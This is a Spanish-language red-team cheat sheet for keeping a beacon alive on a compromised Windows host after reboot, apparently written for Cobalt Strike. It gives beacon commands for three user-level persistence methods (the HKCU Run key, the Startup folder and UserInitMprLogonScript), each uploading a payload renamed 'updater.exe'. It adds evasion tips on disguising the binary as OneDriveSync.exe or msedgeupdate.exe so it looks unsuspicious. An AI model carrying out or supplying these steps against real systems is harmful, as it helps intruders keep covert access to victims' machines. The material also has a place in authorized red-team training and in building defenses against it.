 
Mantener el acceso al sistema (beacon) incluso después de un reinicio, con privilegios de usuario. No es necesario aplicar todos los métodos. **Con uno que funcione correctamente es suficiente.**

## 🧩 Método 1: **Registry Run Key (HKCU)**

✅ Funciona como usuario (no requiere privilegios de administrador). Fácil **OPSEC**.

### 🪪 Descripción

Utiliza la clave de registro `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` para ejecutar automáticamente un binario cada vez que el usuario inicie sesión.

```powershell
beacon> cd C:\Users\<usuario>\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

🧼 **Para eliminar la persistencia:**

```powershell
beacon> reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```


## 🧩 Método 2: **Startup Folder**

✅ Persistencia simple y efectiva sin privilegios.

### 🪪 Descripción

Archivos colocados en la carpeta de **Inicio de Programas** del usuario se ejecutan al iniciar sesión.

```powershell
beacon> cd "C:\Users\<usuario>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```


## 🧩 Método 3: **UserInitMprLogonScript (HKCU Environment)**

✅ Persistencia menos común, aún útil sin admin.

### 🪪 Descripción

Setea un script para que se ejecute al iniciar sesión desde la variable `UserInitMprLogonScript`, una técnica menos sospechosa.

```powershell
beacon> cd C:\Users\<usuario>\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
```

> 🧠 Ten en cuenta que el nombre de la variable debe estar **exactamente así**: `UserInitMprLogonScript`.



## 🧠 Recomendaciones Generales

- 📁 **Ruta recomendada para el binario:**  
    `%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe`  
    Es común y poco sospechosa.
    
- 👻 **Nombre del binario:**  
    Usa nombres creíbles como `updater.exe`, `OneDriveSync.exe`, `msedgeupdate.exe`, etc.
    
- ✅ **Prueba la persistencia:**  
    Haz logoff/login para validar que el beacon vuelve.

